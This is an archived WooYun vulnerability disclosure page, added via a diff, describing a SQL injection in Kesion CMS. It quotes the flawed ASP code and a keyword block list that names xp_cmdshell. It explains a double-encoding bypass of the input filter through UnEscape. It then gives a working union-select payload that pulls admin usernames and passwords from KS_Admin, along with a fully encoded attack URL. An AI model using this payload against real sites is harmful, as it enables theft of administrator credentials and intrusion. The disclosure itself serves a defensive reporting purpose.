@@ -1,0 +1,233 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Kesion cms注入漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Kesion cms注入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/ywledoc">ywledoc</a> 
+</li><li>提交时间：		2012-05-22 17:04</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-05-22：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-07-06：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">函数过滤混乱导致注入</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>Dim KS:Set KS=New PublicCls<br />
+Dim Action<br />
+Action=KS.S(&quot;Action&quot;)<br />
+Select Case Action<br />
+ Case &quot;Ctoe&quot; CtoE<br />
+ Case &quot;GetTags&quot; GetTags<br />
+ Case &quot;GetRelativeItem&quot; GetRelativeItem //问题函数<br />
+ ...skip...<br />
+ Case &quot;getonlinelist&quot; getonlinelist<br />
+End Select</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>Sub GetRelativeItem() //漏洞函数开始<br />
+    Dim Key:Key=UnEscape(KS.S(&quot;Key&quot;))//漏洞位置，只调用ks.s函数，无其它过滤。<br />
+    Dim Rtitle:rtitle=lcase(KS.G(&quot;rtitle&quot;))<br />
+    Dim RKey:Rkey=lcase(KS.G(&quot;Rkey&quot;))<br />
+    Dim ChannelID:ChannelID=KS.ChkClng(KS.S(&quot;Channelid&quot;))<br />
+    Dim ID:ID=KS.ChkClng(KS.G(&quot;ID&quot;))<br />
+    Dim Param,RS,SQL,k,SqlStr<br />
+    If Key&lt;&gt;&quot;&quot; Then<br />
+      If (Rtitle=&quot;true&quot; Or RKey=&quot;true&quot;) Then<br />
+       If Rtitle=&quot;true&quot; Then<br />
+         param=Param &amp; &quot; title like &#039;%&quot; &amp; key &amp; &quot;%&#039;&quot;//类似搜索型注入漏洞。<br />
+       end if<br />
+       If Rkey=&quot;true&quot; Then<br />
+         If Param=&quot;&quot; Then<br />
+           Param=Param &amp; &quot; keywords like &#039;%&quot; &amp; key &amp; &quot;%&#039;&quot;<br />
+         Else<br />
+           Param=Param &amp; &quot; or keywords like &#039;%&quot; &amp; key &amp; &quot;%&#039;&quot;<br />
+         End If<br />
+       End If<br />
+    Else<br />
+       Param=Param &amp; &quot; keywords like &#039;%&quot; &amp; key &amp; &quot;%&#039;&quot;<br />
+    End If<br />
+   End If<br />
+   <br />
+    <br />
+    If Param&lt;&gt;&quot;&quot; Then <br />
+        Param=&quot; where InfoID&lt;&gt;&quot; &amp; id &amp; &quot; and (&quot; &amp; param &amp; &quot;)&quot;<br />
+    else<br />
+       Param=&quot; where InfoID&lt;&gt;&quot; &amp; id<br />
+    end if<br />
+    <br />
+     If ChannelID&lt;&gt;0 Then Param=Param &amp; &quot; and ChannelID=&quot; &amp; ChannelID<br />
+     <br />
+     Param=Param &amp; &quot; and verific=1&quot;<br />
+   <br />
+    SqlStr=&quot;Select top 30 ChannelID,InfoID,Title From KS_ItemInfo &quot; &amp; Param &amp; &quot; order by id desc&quot; //查询<br />
+    Set RS=Server.CreateObject(&quot;ADODB.RECORDSET&quot;)<br />
+    RS.Open SqlStr,conn,1,1<br />
+    If Not RS.Eof Then<br />
+     SQL=RS.GetRows(-1)<br />
+    End If<br />
+    RS.Close</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+先进行了过滤，然后才调用UnEscape解码，<br />
+<br />
+</p><pre><code>Public Function S(Str)<br />
+    S = DelSql(Replace(Replace(Request(Str), &quot;&#039;&quot;, &quot;&quot;), &quot;&quot;&quot;&quot;, &quot;&quot;))</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>Function DelSql(Str)<br />
+      Dim SplitSqlStr,SplitSqlArr,I<br />
+      SplitSqlStr=&quot;dbcc|alter|drop|*|and |exec|or |insert|select|delete|update|count |master|truncate|declare|char|mid|chr|set |where|xp_cmdshell&quot;<br />
+      SplitSqlArr = Split(SplitSqlStr,&quot;|&quot;)<br />
+      For I=LBound(SplitSqlArr) To Ubound(SplitSqlArr)<br />
+         If Instr(LCase(Str),SplitSqlArr(I))&gt;0 Then<br />
+            Die &quot;&lt;script&gt;alert(&#039;系统警告！\n\n1、您提交的数据有恶意字符&quot; &amp; SplitSqlArr(I) &amp;&quot;;\n2、您的数据已经被记录;\n3、您的IP：&quot;&amp;GetIP&amp;&quot;;\n4、操作日期：&quot;&amp;Now&amp;&quot;;\n      Powered By Kesion.Com!&#039;);window.close();&lt;/script&gt;&quot;<br />
+         End if<br />
+      Next<br />
+      DelSql = Str<br />
+    End Function</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+如果配合Unescape()函数，刚过滤不会生效。可以采用unicode编码方式，则不会在浏览器中出现被过滤的字符。例如，单引号可以编码为。%2527，经过解码后还是“&#039;”号，这样的话，就可以利用类似php的二次编码漏洞的方式绕过过滤了。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">注入语句：%&#039;) union select 1,2,username+&#039;|&#039;+ password from KS_Admin<br />
+<br />
+<br />
+<br />
+转换如下：<br />
+<br />
+/plus/ajaxs.asp?action=GetRelativeItem&amp;key=search%2525%2527%2529%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2575%2573%2565%2572%256e%2561%256d%2565%252b%2527%257c%2527%252b%2570%2561%2573%2573%2577%256f%2572%2564%2520%2566%2572%256f%256d%2520%254b%2553%255f%2541%2564%256d%2569%256e%2500 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">UnEscape()函数调用位置放在函数体内，或者不调用。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/ywledoc" title="ywledoc">ywledoc</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07419" title="Kesion cms注入漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：8 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7419";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
